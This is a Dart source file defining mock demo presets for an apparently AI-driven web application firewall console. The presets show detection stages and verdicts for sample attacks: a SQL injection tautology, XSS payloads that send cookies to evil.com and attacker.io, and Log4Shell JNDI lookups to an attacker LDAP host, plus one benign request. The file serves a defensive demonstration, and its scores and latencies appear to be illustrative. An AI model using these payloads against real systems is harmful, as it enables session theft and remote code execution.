class PipelineStage {
  final int stageNumber;
  final String title;
  final String latency;
  final String detail;
  final bool isPassed;
  final bool isTriggered;
  final String statusText;

  const PipelineStage({
    required this.stageNumber,
    required this.title,
    required this.latency,
    required this.detail,
    required this.isPassed,
    required this.isTriggered,
    required this.statusText,
  });
}

class TokenHighlight {
  final String text;
  final bool isCritical;
  final bool isSecondary;

  const TokenHighlight({
    required this.text,
    this.isCritical = false,
    this.isSecondary = false,
  });
}

class InspectionPreset {
  final String key;
  final String label;
  final String method;
  final String endpoint;
  final String payload;
  final Map<String, String> headers;
  final String verdictName;
  final String verdictSeverity;
  final int score;
  final String confidence;
  final String firewallAction;
  final String firewallDetail;
  final double runtimeMs;
  final List<PipelineStage> stages;
  final List<TokenHighlight> tokens;

  const InspectionPreset({
    required this.key,
    required this.label,
    required this.method,
    required this.endpoint,
    required this.payload,
    required this.headers,
    required this.verdictName,
    required this.verdictSeverity,
    required this.score,
    required this.confidence,
    required this.firewallAction,
    required this.firewallDetail,
    required this.runtimeMs,
    required this.stages,
    required this.tokens,
  });

  static List<InspectionPreset> getPresets() {
    return [
      const InspectionPreset(
        key: 'sqli',
        label: 'Preset: SQLi Blind',
        method: 'POST',
        endpoint: '/api/v2/users/authenticate',
        payload: '{"username": "admin\' OR 1=1;--", "password": "xyz"}',
        headers: {
          'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64)',
          'Content-Type': 'application/json',
        },
        verdictName: 'SQL Injection — Tautology',
        verdictSeverity: 'AI Verdict: Critical Malicious',
        score: 97,
        confidence: '99.84%',
        firewallAction: 'FIREWALL ACTION: IMMEDIATE DROP',
        firewallDetail: 'HTTP 403 Forbidden · Connection Reset',
        runtimeMs: 3.12,
        stages: [
          PipelineStage(
            stageNumber: 1,
            title: 'Stage 1: Normalization & Decoding',
            latency: '0.14ms',
            detail: 'UTF-8 & Hex Normalization complete. Zero null-bytes.',
            isPassed: true,
            isTriggered: false,
            statusText: 'Passed',
          ),
          PipelineStage(
            stageNumber: 2,
            title: 'Stage 2: OWASP Core Ruleset (CRS)',
            latency: '0.45ms',
            detail: 'Signatures #942100 (SQLi Auth), #942120 (Tautology boolean).',
            isPassed: false,
            isTriggered: true,
            statusText: 'Matched (2)',
          ),
          PipelineStage(
            stageNumber: 3,
            title: 'Stage 3: Sentinel Transformer Attention',
            latency: '2.21ms',
            detail: 'Cross-token attention spikes on auth delimiters.',
            isPassed: false,
            isTriggered: true,
            statusText: '2.21ms',
          ),
          PipelineStage(
            stageNumber: 4,
            title: 'Stage 4: Risk Fusion Scorer',
            latency: '0.18ms',
            detail: 'Weight ratio: 0.85 ML Sentinel + 0.15 Deterministic Rules.',
            isPassed: true,
            isTriggered: false,
            statusText: '97.4 Score',
          ),
          PipelineStage(
            stageNumber: 5,
            title: 'Stage 5: Policy Evaluation',
            latency: '0.14ms',
            detail: 'Score exceeds Strict Production Threshold (>80.0).',
            isPassed: false,
            isTriggered: true,
            statusText: 'Drop Policy',
          ),
        ],
        tokens: [
          TokenHighlight(text: '{"username": '),
          TokenHighlight(text: '"admin\'', isSecondary: true),
          TokenHighlight(text: ' OR ', isCritical: true),
          TokenHighlight(text: '1=1', isCritical: true),
          TokenHighlight(text: ';--"', isSecondary: true),
          TokenHighlight(text: ', "password": "xyz"}'),
        ],
      ),
      const InspectionPreset(
        key: 'xss',
        label: 'Preset: XSS Polyglot',
        method: 'GET',
        endpoint: '/search?query=<script>document.location="http://evil.com/"+document.cookie</script>',
        payload: '<svg/onload=fetch("//attacker.io/"+btoa(document.cookie))>',
        headers: {
          'User-Agent': 'curl/7.68.0',
          'Accept': 'text/html,application/xhtml+xml',
        },
        verdictName: 'Cross-Site Scripting (Reflected XSS)',
        verdictSeverity: 'AI Verdict: High Severity Anomaly',
        score: 89,
        confidence: '98.12%',
        firewallAction: 'FIREWALL ACTION: SANITIZE & BLOCK',
        firewallDetail: 'HTTP 400 Bad Request · Sanitized Payload Rejected',
        runtimeMs: 2.84,
        stages: [
          PipelineStage(
            stageNumber: 1,
            title: 'Stage 1: Normalization & Decoding',
            latency: '0.12ms',
            detail: 'HTML Entity de-obfuscation performed.',
            isPassed: true,
            isTriggered: false,
            statusText: 'Passed',
          ),
          PipelineStage(
            stageNumber: 2,
            title: 'Stage 2: OWASP Core Ruleset (CRS)',
            latency: '0.38ms',
            detail: 'Signature #941100 (XSS Script Tag Injection).',
            isPassed: false,
            isTriggered: true,
            statusText: 'Matched (1)',
          ),
          PipelineStage(
            stageNumber: 3,
            title: 'Stage 3: Sentinel Transformer Attention',
            latency: '2.08ms',
            detail: 'SVG inline handler token cluster anomalous attention.',
            isPassed: false,
            isTriggered: true,
            statusText: '2.08ms',
          ),
          PipelineStage(
            stageNumber: 4,
            title: 'Stage 4: Risk Fusion Scorer',
            latency: '0.14ms',
            detail: 'XSS Reflected Vector matched severity matrix.',
            isPassed: true,
            isTriggered: false,
            statusText: '89.2 Score',
          ),
          PipelineStage(
            stageNumber: 5,
            title: 'Stage 5: Policy Evaluation',
            latency: '0.12ms',
            detail: 'Policy triggers strict payload drop.',
            isPassed: false,
            isTriggered: true,
            statusText: 'Sanitize Drop',
          ),
        ],
        tokens: [
          TokenHighlight(text: '<svg/onload='),
          TokenHighlight(text: 'fetch(', isCritical: true),
          TokenHighlight(text: '"//attacker.io/"', isSecondary: true),
          TokenHighlight(text: '+btoa(document.cookie)', isCritical: true),
          TokenHighlight(text: ')>'),
        ],
      ),
      const InspectionPreset(
        key: 'log4j',
        label: 'Preset: Log4j JNDI',
        method: 'POST',
        endpoint: '/api/v1/telemetry',
        payload: '{"client_id": "\${jndi:ldap://attacker.dnslog.cn/a}", "env": "prod"}',
        headers: {
          'X-Api-Version': '\${jndi:rmi://198.51.100.1:1099/obj}',
          'Content-Type': 'application/json',
        },
        verdictName: 'Remote Code Execution (Log4Shell JNDI)',
        verdictSeverity: 'AI Verdict: CRITICAL ZERO-DAY RCE',
        score: 99,
        confidence: '99.96%',
        firewallAction: 'FIREWALL ACTION: IMMEDIATE DROP (403)',
        firewallDetail: 'TCP Reset · Immediate Edge Blackhole',
        runtimeMs: 3.41,
        stages: [
          PipelineStage(
            stageNumber: 1,
            title: 'Stage 1: Normalization & Decoding',
            latency: '0.16ms',
            detail: 'JNDI Protocol token resolver identified.',
            isPassed: true,
            isTriggered: false,
            statusText: 'Passed',
          ),
          PipelineStage(
            stageNumber: 2,
            title: 'Stage 2: OWASP Core Ruleset (CRS)',
            latency: '0.51ms',
            detail: 'Signatures #944150 (Log4j Remote Lookup).',
            isPassed: false,
            isTriggered: true,
            statusText: 'Matched (3)',
          ),
          PipelineStage(
            stageNumber: 3,
            title: 'Stage 3: Sentinel Transformer Attention',
            latency: '2.44ms',
            detail: 'Variable expansion sub-AST parsing triggers 0.998 spike.',
            isPassed: false,
            isTriggered: true,
            statusText: '2.44ms',
          ),
          PipelineStage(
            stageNumber: 4,
            title: 'Stage 4: Risk Fusion Scorer',
            latency: '0.17ms',
            detail: 'Heuristic weight: 0.99 Max Threat.',
            isPassed: true,
            isTriggered: false,
            statusText: '99.9 Score',
          ),
          PipelineStage(
            stageNumber: 5,
            title: 'Stage 5: Policy Evaluation',
            latency: '0.13ms',
            detail: 'Zero-tolerance CVE mitigation enacted.',
            isPassed: false,
            isTriggered: true,
            statusText: 'Blackhole',
          ),
        ],
        tokens: [
          TokenHighlight(text: '{"client_id": "'),
          TokenHighlight(text: '\${jndi:', isCritical: true),
          TokenHighlight(text: 'ldap://attacker.dnslog.cn/a', isCritical: true),
          TokenHighlight(text: '}"', isSecondary: true),
          TokenHighlight(text: ', "env": "prod"}'),
        ],
      ),
      const InspectionPreset(
        key: 'benign',
        label: 'Preset: Clean Benign',
        method: 'POST',
        endpoint: '/api/v2/users/authenticate',
        payload: '{"username": "j_miller@sentinel.internal", "password": "SafeK3y#Secure98"}',
        headers: {
          'User-Agent': 'Sentinel-Console-App/4.8.2',
          'Content-Type': 'application/json',
        },
        verdictName: 'Clean Request — Verified Benign',
        verdictSeverity: 'AI Verdict: Legitimate Request',
        score: 3,
        confidence: '99.40%',
        firewallAction: 'FIREWALL ACTION: ALLOW PASS-THROUGH (200)',
        firewallDetail: 'Latency: 1.96ms · Upstream Relayed Cleanly',
        runtimeMs: 1.96,
        stages: [
          PipelineStage(
            stageNumber: 1,
            title: 'Stage 1: Normalization & Decoding',
            latency: '0.11ms',
            detail: 'ASCII format validated. Standard RFC delimiters.',
            isPassed: true,
            isTriggered: false,
            statusText: 'Passed',
          ),
          PipelineStage(
            stageNumber: 2,
            title: 'Stage 2: OWASP Core Ruleset (CRS)',
            latency: '0.29ms',
            detail: 'Zero CRS rule trigger. Clean syntax AST.',
            isPassed: true,
            isTriggered: false,
            statusText: 'Clean (0)',
          ),
          PipelineStage(
            stageNumber: 3,
            title: 'Stage 3: Sentinel Transformer Attention',
            latency: '1.42ms',
            detail: 'Low attention variance across all token spans.',
            isPassed: true,
            isTriggered: false,
            statusText: '1.42ms',
          ),
          PipelineStage(
            stageNumber: 4,
            title: 'Stage 4: Risk Fusion Scorer',
            latency: '0.10ms',
            detail: 'Residual baseline noise only.',
            isPassed: true,
            isTriggered: false,
            statusText: '2.8 Score',
          ),
          PipelineStage(
            stageNumber: 5,
            title: 'Stage 5: Policy Evaluation',
            latency: '0.04ms',
            detail: 'Allow rule confirmed for production upstream.',
            isPassed: true,
            isTriggered: false,
            statusText: 'Allow 200',
          ),
        ],
        tokens: [
          TokenHighlight(text: '{"username": '),
          TokenHighlight(text: '"j_miller@sentinel.internal"'),
          TokenHighlight(text: ', "password": '),
          TokenHighlight(text: '"SafeK3y#Secure98"}'),
        ],
      ),
    ];
  }
}

